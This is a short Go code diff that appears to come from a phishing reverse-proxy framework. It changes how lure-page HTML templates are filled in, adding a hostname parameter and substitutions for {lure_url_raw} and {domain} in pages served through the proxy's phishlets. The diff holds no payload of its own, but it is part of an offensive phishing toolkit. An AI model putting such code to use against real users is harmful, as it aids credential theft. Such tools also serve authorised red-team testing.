@@ -502,7 +502,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											html = p.injectOgHeaders(l, html)
 
 											body := string(html)
-											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+											body = p.replaceHtmlParams(body, lure_url, p.cfg.PhishletConfig(pl_name).Hostname, &s.Params)
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
@@ -1437,7 +1437,7 @@ func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
 	return ret
 }
 
-func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {
+func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, hostname string, params *map[string]string) string {
 
 	// generate forwarder parameter
 	t := make([]byte, 5)
@@ -1449,6 +1449,7 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 	t[0] = crc
 	fwd_param := base64.RawURLEncoding.EncodeToString(t)
 
+	body = strings.Replace(body, "{lure_url_raw}", lure_url, -1)
 	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
 
 	for k, v := range *params {
@@ -1482,7 +1483,7 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[
 
 	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
-	body = strings.Replace(body, "{lure_url_enc}", lure_enc, -1)
+	body = strings.Replace(body, "{domain}", hostname, -1)
 
 	return body
 }
